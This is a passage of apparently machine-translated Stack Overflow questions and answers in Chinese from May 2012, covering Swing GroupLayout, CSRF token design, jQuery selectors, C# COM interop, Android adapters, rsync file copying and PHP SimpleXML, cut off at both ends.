                    .addPreferredGap(ComponentPlacement.RELATED)
                    .addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
                        .addComponent(brand, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                        .addComponent(price, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                    .addPreferredGap(ComponentPlacement.RELATED)
                    .addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
                        .addComponent(rugType, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                        .addComponent(materialType, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                        .addComponent(rugAmount, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                    .addPreferredGap(ComponentPlacement.RELATED)
                    .addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
                        .addComponent(textField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                        .addComponent(textField_1, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                        .addComponent(okButton))
                    .addContainerGap(187, Short.MAX_VALUE))
        ); 
```

现在我需要在单击 OK 按钮后添加新组件。如何修改 groupLayout？是否有 .getVerticalGroup 方法或类似的东西？需要帮忙。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T13:28:14.047

正如@maress 所说，您可以使用对象引用，例如：

```
GroupLayout.Group horizontal =
        groupLayout.createParallelGroup(Alignment.LEADING)
            .addGroup(groupLayout.createSequentialGroup()
                .addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
                    .addGroup(groupLayout.createSequentialGroup()
                        .addGap(10)
                        .addComponent(BrandName, GroupLayout.PREFERRED_SIZE, 134, GroupLayout.PREFERRED_SIZE))
                    .addGroup(groupLayout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(brand, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(ComponentPlacement.RELATED)
                        .addComponent(price, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                    .addGroup(groupLayout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(rugType, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(ComponentPlacement.RELATED)
                        .addComponent(materialType, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(ComponentPlacement.RELATED)
                        .addComponent(rugAmount, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                    .addGroup(groupLayout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(textField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(ComponentPlacement.RELATED)
                        .addComponent(textField_1, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(ComponentPlacement.RELATED)
                        .addComponent(okButton, GroupLayout.PREFERRED_SIZE, 55, GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(115, Short.MAX_VALUE));

groupLayout.setHorizontalGroup(horizontal); 
```

之后，使用水平对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T12:53:46.023

我认为您必须保留对要编辑的组的引用

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T12:32:34.207

使用*NetBeans IDE*创建您的布局，只需在设计模式中将*SWING*元素拖放到上面。`Jframe`

如果要在*运行时*更改布局，可以执行以下操作之一：

1.  通过调查*IDE*生成的代码进行概括，以了解`components`要添加什么以及如何添加
2.  创建测试设计`Jframe`以生成代码，并在运行时使用该代码（通过更改/复制/粘贴到所需位置）

在返回的对象上使用 `groupLayout.getVerticalGroup()`和使用它们的方法来删除或新的组件。`groupLayout.getHorizontalGroup()`

# javascript - 可以使用（加密强）会话 cookie 作为 CSRF 令牌吗？

> ID：10685068
> 
> 赞同：6
> 
> 时间：2012-05-21T12:14:54.150
> 
> 标签：javascript, security, web, csrf

阅读[OWASP CSRF 预防备忘单](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)，提出的防止此类攻击的方法之一是同步器令牌模式。

如果会话令牌在密码学上很强大，它是否可以像下面的伪代码中描述的那样兼作 csrf 令牌？

客户：

```
<script>
dom.replace(placeholder, getCookie("session-cookie"))
</script>

<form>
<input type="hidden" name="csrf-cookie" value="placeholder-value"/>
<input type="text" />
</form> 
```

服务器：

```
if(request.getParameter("csrf-cookie") != user.getSessionCookie())
    print "get out you evil hacker" 
```

cookie 在页面加载时使用 javascript 设置，以防止用户在例如通过电子邮件将页面副本通过电子邮件发送给朋友时意外泄露会话 cookie。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-21T13:43:01.777

**不**，您不应该重复使用会话令牌作为您的 CSRF 令牌。OWASP CSRF 预防备忘单给出了为什么不希望使用会话标识符作为 CSRF 令牌的原因：

> 虽然这种方法可以有效降低跨站点请求伪造的风险，但在 HTTP 参数中包含经过身份验证的会话标识符可能会增加会话劫持的总体风险。架构师和开发人员必须确保没有网络设备或自定义应用程序代码或模块明确记录或以其他方式披露 HTTP POST 参数。

和

> 跨站点脚本攻击也可以利用在 HTML 中包含会话标识符来绕过 HTTPOnly 保护。大多数现代浏览器会阻止客户端脚本访问 HTTPOnly cookie。但是，如果将 HTTPOnly 会话标识符放在 HTML 中，则会失去这种保护，因为客户端脚本可以轻松遍历并从 DOM 中提取标识符。仍然鼓励开发人员实现本文所述的同步器令牌模式。

[这里](http://www.clfsrpm.net/csrf/)有一些关于为什么使用会话 id 作为 CSRF 令牌可能不是一个好主意的想法。[本文](http://heine.familiedeelstra.com/packetstorm-advisory-csrf-march-2012)提到了对普通 http 连接进行数据包嗅探以及对它们进行中间人攻击的能力作为潜在风险。

因此，CSRF 令牌必须是一个不同的令牌，否则如果我们假设攻击者已经知道会话标识符，那么 CSRF 令牌将很容易被猜到！更加防御性地说：玩火可能不是一个好主意：没有必要重新使用会话 ID 作为 CSRF 令牌，这样做只会打开另一个可能被利用的攻击面。没有重复使用，不用担心。

因此，尽管会话令牌在密码学上是安全的，但它还应该独立于 CSRF 令牌（也在概率意义上），以便整个事物在上述假设下工作。这也是为什么任何实现示例总是从头开始创建其令牌的原因。

您可以使用加密安全的随机数生成器来创建字节序列，对它们进行十六进制或 Base64 编码以获得要嵌入页面的字符串。 [OWASP](https://www.owasp.org/index.php/Insufficient_Session-ID_Length)建议长度为 128 位，假设熵为 64 位（例如，将 8 个随机字节转换为 16 字节十六进制字符串）。该序列的长度决定了安全级别：猜测一个 10 字节的安全随机数（具有 80 位熵）以 2^(-80) 的概率成功，这在大多数应用程序中应该足够了。所以你的最终令牌应该有 20 字节的长度，一个 10 字节的随机数转换为十六进制编码。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-21T12:19:18.947

任何无法被外部站点检索到的东西都可以用作 CSRF 令牌。所以会话 cookie 的内容对此很好。

# jquery - 在jQuery中传递数字变量

> ID：10685081
> 
> 赞同：1
> 
> 时间：2012-05-21T12:15:44.283
> 
> 标签：jquery, variables, numbers, numeric

为什么我不能像这样将 num 变量传递给这个函数：

```
 function getColumnData(num) {
    var colVals = $('#newtable td:nth-child(num)').map(function(){
       return $(this).text();
    }).get();
    alert(colVals);
    } 
```

有没有简单的方法解决这个问题？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T12:16:51.757

您需要将 的值`num`与选择器字符串连接起来：

```
var colVals = $('#newtable td:nth-child(' + num + ')').map(function() {
    //Do stuff
}); 
```

目前，您只有一个字符串文字“#newtable td:nth-child(num)”，而不是对选择器引擎有意义的东西，例如“#newtable td:nth-child(2)”。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-21T12:17:11.153

因为您的 jQuery 选择器是一个字符串，所以您需要使用连接来“构建”它，如下所示：

```
$('#newtable td:nth-child(' + num + ')') 
```

否则`num`只是字符串文字中的一些字符。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-21T12:19:25.337

试试2号线

```
var colVals = $('#newtable td:nth-child(' + num + ')').map(function(){ 
```

# google-app-engine - 用户重新加载页面时未调用频道状态网址

> ID：10685085
> 
> 赞同：1
> 
> 时间：2012-05-21T12:16:05.323
> 
> 标签：google-app-engine, channel-api

我在 SDK 1.6.5，Python 2.5

当我启动我的开发服务器并在 127.0.0.1 访问我的频道测试页面时，一切正常 - 生成令牌并传递到前端，套接字打开，接收到客户端连接的 ping，我的应用程序向客户端发送一条消息，它被接收.

如果我重新加载页面：
- 我的日志中没有显示断开连接 ping（应该吗？）
- 生成新令牌（OK）
- 前端 js 记录使用新令牌打开的套接字（OK）
- 没有收到客户端连接的 ping
- 。 ..我的服务器端代码现在不知道这个套接字是打开的并且不知道如何向客户端发送消息

我是否误解了这里的正确流程？

如果我移动+重新加载页面，它是一样的。我必须重新启动开发服务器才能让一切恢复正常。

使用 djangoappengine：

```
inbound_services:
- warmup
- channel_presence

handlers:
- url: /_ah/channel/.*
  script: djangoappengine/main/main.py 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T22:30:52.990

如果您使用相同的客户端 ID，这或多或少是预期的。基本原因是：给定的客户端 ID、应用 ID 和版本映射到特定的 XMPP 端点。如果客户端在短时间内（例如，几秒钟）离线，XMPP 前端不希望向客户端发送断开/连接通知。页面刷新基本上就像丢失并重新协商网络连接，因此这种情况被视为暂时断开的连接，并且不会发送断开/连接。

如果您确实需要在页面刷新时断开连接，您可以通过在每个页面请求上调用 create_channel 时使用不同的客户端 ID 来解决此问题。

# c# - 如何声明一个 COM 接口以便它可以转换？

> ID：10685104
> 
> 赞同：0
> 
> 时间：2012-05-21T12:16:54.697
> 
> 标签：c#, visual-studio-2010, com, .net-3.5, interface

首先，我必须说我是 C#、.NET 和 COM 互操作的新手。

当我尝试将 COM 对象强制转换为我编写的接口类型时，我收到以下错误消息：

错误消息：无法将“System.__ComObject”类型的 COM 对象转换为接口类型“Observer.IObserver”。此操作失败，因为 IID 为“{13478219-8C3B-4849-99D9-27CEF1A49A55}”的接口的 COM 组件上的 QueryInterface 调用因以下错误而失败：不支持此类接口（来自 HRESULT 的异常：0x80004002 (E_NOINTERFACE)） .

我在 Windows 7 上使用 VS2010 (.NET Framework 3.5)。

这是我的界面（观察者类库项目）：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

namespace Observer
{
    [ComImport]
    [Guid("2B2D0BC7-A7C6-4924-A3DE-42F7075E5947")]
    public interface IObservable
    {
        void attach(IObserver observer);
        void detach(IObserver observer);

        void notify();
    }

    [ComImport]
    [Guid("13478219-8C3B-4849-99D9-27CEF1A49A55")]
    public interface IObserver
    {
        void update(IObservable observable);
    }
} 
```

在构建这个 dll 时，我有这个警告：
Observer.dll 不包含任何可以为 COM 互操作注册的类型（肯定是因为接口是在其他 dll 中实现的）。
IObserver 没有出现在我的注册表中（HKEY_CLASSES_ROOT\Interface 中没有）。

这是失败的代码（合成类库项目）：

```
// Arguments de la méthode permettant de récupérer un objet selon son chemin
Object[] args;
// Objet représentant l'état technique de la synthèse
Observer.IObserver pEtatTechniqueSynthese;

args = new Object[] { m_sFullName + "/Etat_Technique" };

pEtatTechniqueSynthese = m_typeSite.InvokeMember("FindObject2",
                        BindingFlags.InvokeMethod,
                        null, m_pSite, args) as Observer.IObserver;

//Here pEtatTechniqueSynthese is null

//This call works fine without casting when pEtatTechniqueSynthese's type is Object
//but I need to cast it because my Observer.IObservable's attach method waits for an Observer.IObserver
//If I don't cast I get a "Exception has been thrown by the target of an invocation"
//=> InnerException : "La valeur n'est pas comprise dans la plage attendue"
//I don't know the exact translation, but it sort of means "Value not in expected range"
pEtatTechniqueSynthese = (Observer.IObserver)m_typeSite.InvokeMember("FindObject2",
                        BindingFlags.InvokeMethod,
                        null, m_pSite, args);

//Exception raised 
```

pEtatTechniqueSynthese 真实类型 Etat_Technique（Syntheses 类库项目）实现了 Observer.IObserver ：

```
public class Etat_Technique : CODRA.SDK.DotNetUtils.COM.IObjectWithSite, Observer.IObservable, Observer.IObserver, ICalculateurEtatTechnique 
```

我所有的程序集都是 COM 可见的。我的 Observer 项目构建选项“注册 COM 互操作”被选中，我使用强名称密钥文件签署了我的程序集。

我无权访问 COM 服务器代码（第三方组件），但我确信问题来自我的代码。
有人知道我错过了什么吗？

==============================================

有关第三方软件的更多信息：

该软件管理对象。
数据结构似乎是一个对象树，根节点被称为站点。
当一个 dll 类想要访问一个对象时，它必须从站点调用“FindObject2”方法，并将对象路径传递给它。这个方法显然返回一个 COM 对象，所以我们可以调用方法，获取属性，...

我可以开发自己的对象类型并将它们添加到软件中，描述类（指定程序集、类、dll、属性……）。

在那里，我想得到一个我开发的对象并将它从 COM 对象转换回它实现的接口。
将对象声明为 Object 并调用其方法就可以了。
在那里，我需要一个 Observer 将其附加到 Observable 上，所以我必须进行投射。
一个解决方案肯定是将附加方法的参数设为对象，但如果我这样做，使用接口就没有兴趣了。

==============================================

基于[Michael Edenfield 的回答的](https://stackoverflow.com/a/10692446/1407337)更多信息：

[ComImport 括号打开]

ComImport 属性是一个猜测。我使用它是因为我可以访问一个用于与第三方代码交互的 utils 文件。
这是此文件中定义的接口。当我按照第三方软件文档所说的方式实现它时，我可以访问站点根对象。
我猜如果他们使用它，我也应该使用它。

```
[ComVisible(true)]
[ComImport]
[Guid("FC4801A3-2BA9-11CF-A229-00AA003D7352") ]
[InterfaceTypeAttribute(ComInterfaceType.InterfaceIsIUnknown)]
public interface IObjectWithSite
{
    void SetSite([MarshalAs(UnmanagedType.IUnknown)]
        [In] object pSite);
    [System.Diagnostics.CodeAnalysis.SuppressMessage("Microsoft.Design", "CA1021:AvoidOutParameters", MessageId = "1#")]
    void GetSite([In] ref Guid riid, [Out] out IntPtr pvSite);
} 
```

我会删除这个属性，你比我更了解底层是什么。此外，问题是一样的，所以这个属性是没有用的。

[ComImport 括号关闭]

糟糕的是，FindObject2 有效地返回了一个 {System.__ComObject}，所以强制转换不起作用，我被一个 InvalidCastException 卡住了，一次又一次，一次又一次，......
好点是我知道它应该使用什么底层类是。

我在“有关第三方软件的更多信息”部分中谈到的解决方法有效，即使 attach 方法采用 Object 参数，然后管理 Objects 而不是 IObservers。为此，我使用 Reflection 调用 IObserver 的更新方法：

```
foreach (Object observer in m_observers)
{
    Object[] args = new Object[] { this };
    observer.GetType().InvokeMember("update",
                            BindingFlags.InvokeMethod,
                            null, observer, args);
} 
```

哎呀，不是吗？但是如果我找不到更干净的东西，这个糟糕的东西会完成工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T20:51:05.073

我不太清楚您要完成什么，但看起来您在这里混淆了几个不同的 COM 互操作概念。

`ComImportAttribute`仅当接口已在某个外部类型库中定义时，使用导入 COM 接口才有意义。如果这是您在 C# 中为您自己的类创建的新接口，那么将其声明为 COM 导入属性不会有任何好处。那是因为没有真正的 COM 对象会实现你的接口，所以你永远无法从`QueryInterface`. 从你对问题的描述来看，`ComImport`是完全错误的做法。

如果您需要向 COM 客户端公开您自己的接口，您只需给它们一个 GUID。如果您不使用该`ComImport`属性，则任何`ComVisible`类或接口都将注册为互操作，假设您已启用它。但是，COM 客户端需要了解您的接口并重新编译以实现它。我也不认为这会解决你的问题。

我不确切知道您的第三方库是如何实例化您的自定义类的；如果这是通过 COM 完成的，那么您将需要导出您的 CoClass 和接口定义才能使其正常工作。它要求程序集和类信息的事实使我怀疑这将是不需要的。

在我看来，您在某处创建了一个托管 C# 对象，该对象实现了您的托管 C# 接口，您只需要获取它。如果该`FindObject`方法实际上返回了您的类型的实例，那么您应该首先将返回值类型转换为具体的 C# 类型，*然后*尝试将其大小写到您的接口。如果您尝试在 a 上使用类型转换运算符来转换`ComObject`为接口，它将运行`QueryInterface`并且几乎肯定会失败。

我从来没有尝试过这个，但作为第一个猜测，我建议首先对 System.Object 进行类型转换。从那里，C# 应该使用托管类型元数据来确定您的接口是否可用并适当地转换。

当然，如果`FindObject`要返回一个实际的 COM 对象，该对象以某种方式包裹在 C# 类周围，则需要首先弄清楚如何从该返回值中获取底层类。

请注意，第三方软件文档中包含的接口是[`IObjectWithSite`](http://msdn.microsoft.com/en-us/library/aa768220%28v=vs.85%29). 这是Windows定义的一个众所周知的接口，所以如果你打算实现这个接口，你*确实*需要使用。`[ComImport]`在这种情况下，站点根对象将调用`IObjectWithSite::SetSite()`您的自定义对象并将其自身传递进来，这就是嵌入式对象“了解”其容器的方式。因为该接口是在外部定义的，所以您需要“导入”它，以便每个人都实现相同的接口。

# ios - 在 iOS 上，为什么下面的 UITapGestureRecognizer (Tap) 不起作用？

> ID：10685114
> 
> 赞同：0
> 
> 时间：2012-05-21T12:17:31.333
> 
> 标签：ios, cocoa-touch, uiview, uiviewcontroller

如果我只是在 Xcode 4.3.2 上启动一个全新的 Single View App 项目，并使用以下代码：

```
@implementation ViewController

- (void)viewDidLoad
{
    [super viewDidLoad];

    UIImageView *imageView = [[UIImageView alloc] 
                              initWithImage:[UIImage imageNamed:@"pic.jpg"]];
    [self.view addSubview:imageView];

    self.view.userInteractionEnabled = YES;
    self.view.multipleTouchEnabled = YES;

    UITapGestureRecognizer* tapRecognizer = [[UITapGestureRecognizer alloc] 
                               initWithTarget:self action:@selector(handleTap:)];
    tapRecognizer.numberOfTapsRequired = 1;

    [imageView addGestureRecognizer:tapRecognizer];
}

-(void) handleTap:(UIGestureRecognizer *) gesture {
    NSLog(@"Image tapped on");
} 
```

`handleTap`即使我点击图像，也不会调用该方法......这里有什么不正确的吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T12:21:43.313

您需要在图像视图中启用触摸（因为默认情况下禁用），而不是在控制器的视图中：

```
imageView.userInteractionEnabled = YES; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:21:06.910

是`<UIGestureRecognizerDelegate>`在你的头文件中@interface 的末尾吗？

# android - 自定义 simpleCursorAdapter 中的 getLayoutInflater

> ID：10685116
> 
> 赞同：8
> 
> 时间：2012-05-21T12:17:51.427
> 
> 标签：android, layout, adapter

我坚持创建自定义适配器。我想在 ListView 内的按钮上设置 OnClickListener，我发现这个主题看起来不错[how-to-setonclicklistener-on-the-button-inside-the-listview](https://stackoverflow.com/questions/8121476/how-to-setonclicklistener-on-the-button-inside-the-listview)但问题是我在 getLayoutInflater 行上遇到无法访问的代码错误.

这是我的代码

```
public class MyCursorAdapter extends SimpleCursorAdapter{

    private final Context ctx;
    private Button tagButton = null;

    public MyCursorAdapter(Context context, int layout, Cursor c,
            String[] from, int[] to) {
        super(context, layout, c, from, to);
        ctx = context;
    }

    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        return super.getView(position, convertView, parent);
        LayoutInflater li = (LayoutInflater) ctx.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        View rowView = li.inflate(R.layout.tags_list_element, null, true);
        tagButton= (Button)rowView.findViewById(R.id.tag_title);
        tagButton.setTag(position);

        tagButton.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View arg0) {
            }
        });
        return rowView;

    }

} 
```

两种方法都不适合我

```
 LayoutInflater inflater = context.getLayoutInflater(); 
```

和

```
LayoutInflater li = (LayoutInflater) ctx.getSystemService(Context.LAYOUT_INFLATER_SERVICE); 
```

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-05-21T12:25:18.977

尝试：

```
View myView = LayoutInflater.from(ctx).inflate(R.layout.my_view, null); 
```

此外，你得到什么例外？

* * *

编辑：在你的“getView”方法中，第一行是“return.....”，所以你的方法的其余部分将永远不会被执行，我认为......;）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-21T12:30:27.867

从性能上看：

```
View myView = LayoutInflater.from(context).inflate(R.layout.my_view, parent, false); 
```

是正确的; 但是将充气机存储在适配器内的最终字段中更有效。

```
private final Context ctx;
private final LayoutInflater mInflater;
private Button tagButton = null;

public MyCursorAdapter(Context context, int layout, Cursor c,
          String[] from, int[] to) {
    super(context, layout, c, from, to);
    ctx = context;
    mInflater = LayoutInflater.from(ctx);
} 
```

然后执行您的 getView 操作。

```
//....
final View v = mInflater.inflate(R.layout.list_item, parent, false);
//....
//stuff here
//
return v; 
```

还要确保你的上下文是你的活动上下文，如果你使用错误的上下文，你会遇到主题问题。

问候，克里斯

# jquery-mobile - 有没有办法在 JQM 选择中设置选定的值？

> ID：10685118
> 
> 赞同：1
> 
> 时间：2012-05-21T12:17:59.580
> 
> 标签：jquery-mobile

我有以下代码来更新我的 jquerymobile 增强的 HTML 选择标记：

```
 var selectTuner = $("#tunerselector");
  selectTuner[0].selectedIndex = 4;
  selectTuner.selectmenu(); // Needed this o/w initialisation error on refresh.
  selectTuner.selectmenu("refresh"); 
```

有没有办法设置值而不是 selectedIndex？

我遇到的问题是我有两个 ajax 请求，一个用于获取选择标记的选项值（来自 xml 文件），另一个用于获取所选值（来自数据库表）。我不想链接我的 ajax 请求，所以我想知道我是否可以设置值而不是选择标记的索引。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T14:34:40.787

尝试

```
$("#tunerselector option[value='yourValueAtIndex4']").attr('selected', 'selected');  
$('#tunerselector').selectmenu('refresh'); 
```

# php - prestashop - 通过 api 创建订单

> ID：10685119
> 
> 赞同：1
> 
> 时间：2012-05-21T12:18:00.530
> 
> 标签：php, prestashop

我只是想知道这种情况是否可行：我们有一个用 php/jscript 编写的小型估算器应用程序，它提供了构建围栏所需的产品列表。现在，我们正在开发我们的在线商店。我们决定使用 prestashop。现在，我们想提供一种直接从我们的估算器应用程序创建订单的可能性。我们希望 1) 创建订单，2) 将产品放入其中，3) 重定向到结帐页面（即[http://store.oursite.com/en/quick-order](http://store.oursite.com/en/quick-order)）。可以这样做吗？如果是的话，你能给我一些建议吗？谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-10T13:42:21.467

您可以直接调用函数 ajaxCart.add = function(idProduct, idCombination, addedFromProductPage, callerElement, quantity, whishlist)

从文件 ajax-cart.js（在 /modules/blockcart 中）

或者您可以通过网络服务来完成，请查看[http://doc.prestashop.com/display/PS14/Using+the+REST+webservice](http://doc.prestashop.com/display/PS14/Using+the+REST+webservice)上的文档。这将为您抽象出订单流程的复杂性！

# raphael - 如何在 Raphael.js 中实现 Perlin 噪声？

> ID：10685120
> 
> 赞同：1
> 
> 时间：2012-05-21T12:18:00.577
> 
> 标签：raphael, effect, perlin-noise

我想在 Raphael.js中创建[Perlin 噪声的实现。](http://en.wikipedia.org/wiki/Perlin_noise)为了演示效果，这里有一个[使用 Flash-AS3 的示例实现](http://atto.s2.pf-x.net/~atto/cgi-bin/up/img/6444.swf)。

几点注意事项：

*   结果不必与示例完美匹配，类似的渲染就足够了。
*   我想将效果放在圆形内。
*   我在 Windows XP 上使用 Raphael 2.01、Firefox 12.0

我已经在 Google 上搜索了实现此功能的方法，但似乎找不到任何方法。如何才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-24T20:08:42.267

Raphael 是一个矢量库 - 不是实现光栅图形效果的好选择。当然可以这样做，但该解决方案效率低下，因为您必须在矢量中实现像素 - 可能是小点或正方形。

考虑改用`<canvas>`element 和纯 JS。

# android - 我的 Android 应用程序中的 Android 版本

> ID：10685121
> 
> 赞同：0
> 
> 时间：2012-05-21T12:18:01.647
> 
> 标签：android

我创建了一个 android 应用程序，在该应用程序中，我在 res 文件夹中创建了文件夹“values”和“values-v14”。

如果我的应用程序安装在版本 15 中会发生什么，它将从哪里获取值：来自 values 或 values-v14？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:36:44.003

请参阅[Android 如何找到最匹配的资源](http://developer.android.com/guide/topics/resources/providing-resources.html#BestMatch)。

同一页面上平台版本（API 级别）限定符的说明：

> 设备支持的 API 级别。例如，v1 用于 API 级别 1（Android 1.0 或更高版本的设备）和 v4 用于 API 级别 4（Android 1.6 或更高版本的设备）。有关这些值的更多信息，请参阅 Android API 级别文档。
> 
> 注意：Android 1.5 和 1.6 仅在与平台版本完全匹配时才匹配具有此限定符的资源。有关详细信息，请参阅下面有关已知问题的部分。

因此`v14`将为 API 级别 14 的设备选择资源，否则`values`将使用更高的文件夹。

# actionscript-3 - 翻转/退出按钮（文本）不适用于补间

> ID：10685124
> 
> 赞同：0
> 
> 时间：2012-05-21T12:18:08.933
> 
> 标签：actionscript-3, flash

在这里我有一些 xml 按钮，当我想在当前按钮上进行补间时，补间在文本上不起作用不知道为什么以及何时我想从当前按钮中删除事件侦听器，它不起作用

这是我的代码

```
 xmlBtn.buttonMode = true;
    xmlBtn.mouseChildren = false;
    xmlBtn.useHandCursor = true;
    xmlBtn.addEventListener("rollOver",rollOverHandler);
    xmlBtn.addEventListener("rollOut",rollOutHandler);

    function rollOverHandler(event:MouseEvent) {
             var rollOverBtn:xmlLinkButton = event.target as xmlLinkButton;
        //fadeIn = new Tween ( rollOverBtn , "alpha" , None.easeOut , 1 , 0.5  , 25 , false );
        rollOverBtn.alpha = 0.8;

// for now this line is only option for me but i want that text have tween
        rollOverBtn.butonText.visible = false;

        if (rollOverBtn == event.target ){
            trace( rollOverBtn.source );
        }
    }

    function rollOutHandler(event:MouseEvent) {
        var rollOutBtn:xmlLinkButton = event.target as xmlLinkButton;
        //fadeIn = new Tween ( rollOutBtn , "alpha" , None.easeIn , 0.6 , 1 , 25 , false );
        rollOutBtn.alpha = 1;
        rollOutBtn.butonText.visible = true;
    } 
```

任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:47:19.777

可能是因为两个 Tweens（in`rollOutHandler`和 in `rollOverHandler`）具有相同的值？

您是否嵌入了字体？

# linux - 自动复制文件

> ID：10685135
> 
> 赞同：1
> 
> 时间：2012-05-21T12:18:35.773
> 
> 标签：linux, bash, shell

我需要一些帮助才能用外壳衬里左右复制一些东西..

例子

```
cp QA/Release/apps/offline/config/logging.yml     Production/Release/apps/offline/config/logging.yml
cp QA/Release/config/nc_databases_dev.yml         Production/Release/config/nc_databases_dev.yml
cp QA/Release/config/nc_databases_live.yml        Production/Release/config/nc_databases_live.yml
cp QA/Release/config/nc_databases_live_dev.yml    Production/Release/config/nc_databases_live_dev.yml
cp QA/Release/config/nc_databases_test.yml        Production/Release/config/nc_databases_test.yml
cp QA/Release/config/nc_databases_va.yml          Production/Release/config/nc_databases_va.yml 
```

如果您看到我正在将 QA/files.. 复制到 Production/files.. 只是前 2 个目录将 QA 更改为 Production，其余路径保持不变。

我可以做到这一点，将文件名写入文件并读取它，然后复制

```
for i in `cat file ` ; do  cp  $i to ?????  ; done 
```

复制 $i 到生产，因为它读取每个源代码行，但只需要删除 QA/ 因为它在运行中复制..

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:24:07.807

你看过[rsync](http://linux.die.net/man/1/rsync)吗？像这样的东西应该做的事情：

```
rsync -a --include '*.yml' QA/Release Production/Release/ 
```

编辑：测试并更正 rsync 行。

此命令会将在 QA/Release 目录下找到的所有符合模式 '*.yml' 的内容复制到 Porduction/Release 树中。A`QA/Release/x/y/z/file.yml`将被复制到`Production/Release/x/y/z/file.yml`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:31:42.617

这与复制目录并重命名它不一样吗？

```
cp -r QA Production 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:43:00.660

```
while read -r name
do
    cp "$name" "PRODUCTION/${name#QA/}"
done < file 
```

作为一个单行：

```
while read -r name; do cp "$name" "PRODUCTION/${name#QA/}"; done < file 
```

# php - SimpleXMLElement 对象

> ID：10685139
> 
> 赞同：-1
> 
> 时间：2012-05-21T12:18:54.417
> 
> 标签：php, xml, simplexml

当我这样做时，`print_r($nodes);`我得到：

```
Array (
  [0] => SimpleXMLElement Object (
    [kategoria_6] => 1
    [opis_6] => 1
    [img] => slides/slide0.jpg
  )
  [1] => SimpleXMLElement Object (
    [kategoria_6] => 2
    [opis_6] => 2
    [img] => slides/slide1.jpg
  )
  [2] => SimpleXMLElement Object (
    [kategoria_6] => 3
    [opis_6] => 3
    [img] => slides/slide4.jpg
  )
  [3] => SimpleXMLElement Object (
    [kategoria_6] => 4
    [opis_6] => 4
    [img] => slides/slide3.jpg
  )
  [4] => SimpleXMLElement Object (
    [kategoria_6] => 7
    [opis_6] => 7
    [img] => slides/slide2.jpg
  )
) 
```

现在在这种情况下，我不能这样做：

```
$nodes->asXML("c:\\aaa.xml"); 
```

因为这是一个我可以做 f.ex 的数组：

```
$nodes[1]->asXML("c:\\aaa.xml"); 
```

但我只会得到一个元素。我需要获取所有这些数组，或者更好地将其更改为：

```
SimpleXMLElement Object (
  [item] => Array (
    [0] => SimpleXMLElement Object (
      [kategoria_6] => 1
      [opis_6] => 1
      [img] => slides/slide0.jpg
    )
    [1] => SimpleXMLElement Object (
      [kategoria_6] => 2
      [opis_6] => 2
      [img] => slides/slide1.jpg
    )
    [2] => SimpleXMLElement Object (
      [kategoria_6] => 3
      [opis_6] => 3
      [img] => slides/slide4.jpg
